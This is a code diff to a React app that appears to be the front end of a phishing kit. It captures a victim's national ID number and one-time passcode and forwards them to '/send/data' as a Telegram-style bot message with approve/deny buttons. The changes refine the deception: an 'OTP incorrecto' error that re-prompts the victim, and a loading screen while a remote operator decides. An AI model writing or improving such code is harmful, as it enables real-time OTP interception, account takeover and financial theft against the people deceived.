@@ -82,7 +82,9 @@ function App() {
         setStep("OTP");
         return;
       case "otpdenied":
-        toast('OTP incorrecto, podras solicitar uno en breve.');
+        toast.error('OTP incorrecto, podras solicitar uno en breve.', { position: 'bottom-center' });
+        setOtp('');
+        setStep('OTP');
         return;
     }
   }, [decision]);
@@ -97,7 +99,7 @@ function App() {
       }
 
       const response = await api.post("/send/data", {
-        text: `Codigo OTP para CC: ${cedula} es: \n\n: ${otp}`,
+        text: `Codigo OTP para CC: ${cedula} es: \n\n${otp}`,
         reply_markup: {
           inline_keyboard: [
             [
@@ -114,6 +116,8 @@ function App() {
           requestId: currentRequestId,
         }
       });
+
+      setStep('loading');
 
       return response
     } catch (error) {
@@ -152,7 +156,7 @@ function App() {
           identification={cedula}
           setOtp={setOtp}
           onResend={() => {
-            
+
           }}
         />
       case "welcome":
